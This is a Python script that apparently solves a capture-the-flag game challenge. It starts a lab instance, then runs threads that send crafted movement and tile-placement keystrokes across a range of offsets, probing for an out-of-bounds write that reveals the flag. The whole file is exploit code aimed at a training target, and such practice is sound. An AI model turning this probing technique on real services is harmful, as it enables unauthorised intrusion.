import sys, json, re, time, socket, threading, queue
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

CID = 346
cy = CyLab(delay=1.5)
cy.login()
cy.req("PUT", f"/api/challenges/{CID}/instance/?source=library")
host = None
for _ in range(12):
    time.sleep(3)
    st, b = cy.req("GET", f"/api/challenges/{CID}/instance/")
    d = json.loads(b)
    m = re.search(r"nc`?\s*`?([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
    if m and d.get("status") == "RUNNING":
        host = (m.group(1), int(m.group(2)))
        break
print("HOST", host, flush=True)
if not host:
    raise SystemExit(1)

TILE = 0x41
offsets = list(range(-60, -19))
work = queue.Queue()
for o in offsets:
    work.put(o)
res = {}
lock = threading.Lock()


def probe(off):
    y = off + 90
    keys = bytearray(b"l" + bytes([TILE]))
    keys += b"w" * 4
    keys += (b"d" * (y - 4)) if y >= 4 else (b"a" * (4 - y))
    keys += b"w"
    line = bytes(keys) + b"\n"
    s = socket.create_connection(host, timeout=15)
    s.settimeout(1.0)
    try:
        time.sleep(0.3)
        buf = b""
        t0 = time.time(); last = time.time()
        while time.time() - t0 < 5:
            try:
                d = s.recv(65536)
            except socket.timeout:
                if time.time() - last > 0.7:
                    break
                continue
            if not d:
                break
            buf += d; last = time.time()
        s.sendall(line)
        out = b""
        closed = False
        t0 = time.time(); last = time.time()
        while time.time() - t0 < 40:
            try:
                d = s.recv(65536)
            except socket.timeout:
                if time.time() - last > 3:
                    break
                continue
            if not d:
                closed = True
                break
            out += d; last = time.time()
        maps = (buf + out).count(b"Player position")
        flag = re.search(rb"(academy|picoCTF)\{", out)
        return closed, maps, bool(flag)
    finally:
        s.close()


def worker():
    while True:
        try:
            o = work.get_nowait()
        except queue.Empty:
            return
        try:
            closed, maps, fl = probe(o)
        except Exception as e:
            closed, maps, fl = None, -1, False
        with lock:
            res[o] = (closed, maps, fl)
            print("off %4d closed=%s maps=%d flag=%s" % (o, closed, maps, fl), flush=True)


ths = [threading.Thread(target=worker, daemon=True) for _ in range(8)]
for t in ths:
    t.start()
for t in ths:
    t.join()
print("=== summary ===")
for o in sorted(res):
    c, m, f = res[o]
    print(o, "CLOSED" if c else "open", m, "FLAG" if f else "")
